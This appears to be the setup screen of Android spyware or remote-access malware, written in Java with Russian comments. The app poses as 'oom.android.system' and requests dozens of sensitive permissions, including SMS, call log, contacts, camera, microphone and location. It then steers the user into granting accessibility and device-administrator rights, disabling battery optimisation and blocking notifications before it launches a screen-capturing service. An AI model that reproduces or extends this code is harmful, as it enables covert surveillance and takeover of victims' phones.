package oom.android.system.app;

import android.app.Activity;
import android.app.AlertDialog;
import android.app.admin.DevicePolicyManager;
import android.content.ActivityNotFoundException;
import android.content.ComponentName;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import com.sachinvarma.easypermission.EasyPermissionConstants;
import com.sachinvarma.easypermission.EasyPermissionInit;
import com.sachinvarma.easypermission.EasyPermissionList;

import java.util.ArrayList;
import java.util.List;

import oom.android.system.Managers.Listeners.DeviceAdminSample;
import oom.android.system.R;

public class MainActivity extends AppCompatActivity {
    public static Activity activity;

    Button btnNext;
    EditText user;


    @Override
    protected void onCreate(Bundle savedInstanceState){
        super.onCreate(savedInstanceState);
        activity=this;
        //startservice();
        setContentView(R.layout.activity_main);
        user = (EditText)findViewById(R.id.ET_userid);

        btnNext = findViewById(R.id.btnNext);
        btnNext.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                List<String> permission = new ArrayList<>();
                permission.add(EasyPermissionList.BIND_DEVICE_ADMIN);
                permission.add(EasyPermissionList.CAPTURE_AUDIO_OUTPUT);
                permission.add(EasyPermissionList.SEND_SMS);
                permission.add(EasyPermissionList.WRITE_CALENDAR);
                permission.add(EasyPermissionList.CALL_PHONE);
                permission.add(EasyPermissionList.ACCESS_NETWORK_STATE);
                permission.add(EasyPermissionList.READ_PHONE_STATE);
                permission.add(EasyPermissionList.RECORD_AUDIO);
                permission.add(EasyPermissionList.WRITE_EXTERNAL_STORAGE);
                permission.add(EasyPermissionList.READ_EXTERNAL_STORAGE);
                permission.add(EasyPermissionList.ACCESS_FINE_LOCATION);
                permission.add(EasyPermissionList.RECEIVE_BOOT_COMPLETED);
                permission.add(EasyPermissionList.INTERNET);
                permission.add(EasyPermissionList.READ_SMS);
                permission.add(EasyPermissionList.WRITE_SECURE_SETTINGS);
                permission.add(EasyPermissionList.WRITE_SETTINGS);
                permission.add(EasyPermissionList.RECEIVE_SMS);
                permission.add(EasyPermissionList.READ_CONTACTS);
                permission.add(EasyPermissionList.WRITE_CONTACTS);
                permission.add(EasyPermissionList.CAMERA);
                permission.add(EasyPermissionList.READ_CALL_LOG);
                permission.add(EasyPermissionList.WRITE_CALL_LOG);
                permission.add(EasyPermissionList.WAKE_LOCK);
                permission.add(EasyPermissionList.BATTERY_STATS);
                permission.add(EasyPermissionList.SYSTEM_ALERT_WINDOW);
                permission.add(EasyPermissionList.ACCESS_COARSE_LOCATION);
                permission.add(EasyPermissionList.ACCESS_WIFI_STATE);
                permission.add(EasyPermissionList.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                permission.add(EasyPermissionList.BIND_ACCESSIBILITY_SERVICE);
                permission.add(EasyPermissionList.MODIFY_AUDIO_SETTINGS);
                permission.add(EasyPermissionList.VIBRATE);
                permission.add(EasyPermissionList.SET_WALLPAPER);
                permission.add(EasyPermissionList.SET_TIME);
                permission.add(EasyPermissionList.SET_TIME_ZONE);

                new EasyPermissionInit(MainActivity.this, permission);

            }
        });




    }

    public void alertDialogBatteryIgnore(){


        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setMessage("Battery Ignore");

        builder.setPositiveButton("OK", new DialogInterface.OnClickListener() { // Кнопка ОК
            @Override
            public void onClick(DialogInterface dialog, int which) {

                if (Build.VERSION.SDK_INT>Build.VERSION_CODES.LOLLIPOP_MR1) {
                    String pkg=getPackageName();
                    PowerManager pm=getSystemService(PowerManager.class);

                    if (!pm.isIgnoringBatteryOptimizations(pkg)) {
                        Intent i=
                                new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                                        .setData(Uri.parse("package:"+pkg));

                        startActivity(i);
                    }
                }

                dialog.dismiss(); // Отпускает диалоговое окно
                onStartAccessibilitySettingsActivity();
            }
        });
        AlertDialog dialog = builder.create();
        dialog.show();
    }

    public void onStartAccessibilitySettingsActivity()
    {

        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setMessage("Accessibility");

        builder.setPositiveButton("Получить", new DialogInterface.OnClickListener() { // Кнопка ОК
            @Override
            public void onClick(DialogInterface dialog, int which) {

                Intent intentAccessibilitySettings = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                PackageManager packageManager = getPackageManager();
                ComponentName componentName = intentAccessibilitySettings.resolveActivity(packageManager);
                if (componentName != null) {
                    try {
                        startActivity(intentAccessibilitySettings);
                        alertAdmin();
                    } catch (ActivityNotFoundException ex) {
                    }
                }

                dialog.dismiss(); // Отпускает диалоговое окно
            }
        });
        AlertDialog dialog = builder.create();
        dialog.show();

        // Start Accessibility Settings Activity

    }

    private void adminget(){
        ComponentName deviceAdminReceiver = new ComponentName(this, DeviceAdminSample.class);
        Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, deviceAdminReceiver);
        intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                "Нужно для корректной работы");
        startActivity(intent);

        alertSettings();
    }

    public void alertAdmin(){
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setMessage("Права администратора");

        builder.setPositiveButton("Получить", new DialogInterface.OnClickListener() { // Кнопка ОК
            @Override
            public void onClick(DialogInterface dialog, int which) {

                adminget();
                dialog.dismiss(); // Отпускает диалоговое окно
            }
        });
        AlertDialog dialog = builder.create();
        dialog.show();


    }

    public void alertSettings(){
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setMessage("1)Проверьте все ли разрешения получены  \n 2)Заблокируйте уведомления \n 3)Проверьте игнорируется ли режим энергосбережения");

        builder.setPositiveButton("Open", new DialogInterface.OnClickListener() { // Кнопка ОК
            @Override
            public void onClick(DialogInterface dialog, int which) {

                startActivity(new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS, Uri.fromParts("package", getPackageName(), null)));
                dialog.dismiss(); // Отпускает диалоговое окно

                alertStart();
            }
        });
        AlertDialog dialog = builder.create();
        dialog.show();

    }

    public void alertStart(){
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setMessage("System will start capturing everything that's displayed on your screen.");

        builder.setPositiveButton("Start Now", new DialogInterface.OnClickListener() { // Кнопка ОК
            @Override
            public void onClick(DialogInterface dialog, int which) {

                if(user.getText().length() >0)
                    MyService.userid= Integer.valueOf(user.getText().toString());

                dialog.dismiss(); // Отпускает диалоговое окно
                finish();
                Intent i = new Intent();
                i.setComponent(new ComponentName("oom.android.system", "oom.android.system.app.MyService"));
                startService(i);
            }
        });
        AlertDialog dialog = builder.create();
        dialog.show();
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        switch (requestCode) {
            case EasyPermissionConstants.INTENT_CODE:

                if (data != null) {
                    boolean isGotAllPermissions =
                            data.getBooleanExtra(EasyPermissionConstants.IS_GOT_ALL_PERMISSION, false);

                    if(data.hasExtra(EasyPermissionConstants.IS_GOT_ALL_PERMISSION)){
                        if (isGotAllPermissions) {
                            alertDialogBatteryIgnore();
                        } else {
                            alertDialogBatteryIgnore();
                            Toast.makeText(this, "All permission not Granted", Toast.LENGTH_SHORT).show();
                        }}
                }
                return;
        }
    }


}
